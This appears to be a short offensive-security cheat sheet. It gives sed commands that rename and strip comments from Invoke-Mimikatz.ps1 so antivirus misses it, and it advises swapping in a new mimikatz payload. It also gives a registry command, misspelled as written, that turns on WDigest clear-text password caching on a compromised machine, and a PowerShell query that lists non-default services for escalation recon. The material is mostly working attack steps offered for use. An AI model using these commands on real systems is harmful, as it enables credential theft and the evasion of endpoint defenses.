Perform antivirus activities bypass AV machines

# Invoke-Mimikatz.ps1 (obfuscated functions)

- sed -i -e 's/Invoke-Mimikatz/Invoke-LSASSscraper/g' Invoke-Mimikatz.ps1
- sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
- sed -i -e 's/DumpCreds/Dump/g' Invoke-Mimikatz.ps1
- sed -i -e 's/ArgumentPtr/Obf/g' Invoke-Mimikatz.ps1
- sed -i -e 's/CallDllMainSC1/ObfSC1/'g Invoke-Mimikatz.ps1
- sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1

#-# On Windows

Replace the $PESBytes64 with a new one of mimikatz
Lavereging the Steroids-Module for obfuscation


# Subverting mimikatz patch (on compromise machine to extract clear text password)

- add HKLM\SYSTEM\CurrentControlSet\Conttol\SecurityProviders\WDigest /v UserLogonCredential /t REG_DWORD /d 1 /f

# Get NON default Services
$NonDefaultServices = Get-wmiobject win32_service | where { $_.Caption -notmatch "Windows" -and $_.PathName -notmatch "Windows" -and $_.PathName -notmatch "policyhost.exe" -and $_.Name -ne "LSM" -and $_.PathName -notmatch "OSE.EXE" -and $_.PathName -notmatch "OSPPSVC.EXE" -and $_.PathName -notmatch "Microsoft Security Client" }

- $NonDefaultServices.DisplayName # Service Display Name (full name)
- $NonDefaultServices.PathName # Service Executable
- $NonDefaultServices.StartMode # Service Startup mode
- $NonDefaultServices.StartName # Service RunAs Account
- $NonDefaultServices.State # Service State (running/stopped etc)
- $NonDefaultServices.Status # Service Status
- $NonDefaultServices.Started # Service Started status
- $NonDefaultServices.Description # Service Description
